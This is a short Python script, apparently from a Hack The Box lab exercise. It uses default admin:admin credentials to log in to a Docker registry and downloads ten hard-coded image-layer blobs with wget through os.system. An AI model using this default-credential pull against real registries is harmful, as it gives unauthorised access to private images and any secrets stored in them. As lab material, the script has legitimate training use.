#!/usr/bin/env python3
import os

blob1 = '302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b'
blob2 = '3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee'
blob3 = '02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c'
blob4 = 'c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7'
blob5 = '2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791'
blob6 = 'a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
blob7 = 'f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0'
blob8 = 'd9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a'
blob9 = '8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797'
blob10 = 'f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff'

url = 'http://docker.registry.htb/v2/bolt-image/blobs/sha256:'

blob_list = [blob1,blob2,blob3,blob4,blob5,blob6,blob7,blob8,blob9,blob10]

for x in blob_list:
	#Debugging
	#print("wget -O " + x + ' ' + url + x)
	os.system("wget --http-user=admin --http-password=admin -O " + x + '.tar.gz ' + url + x)
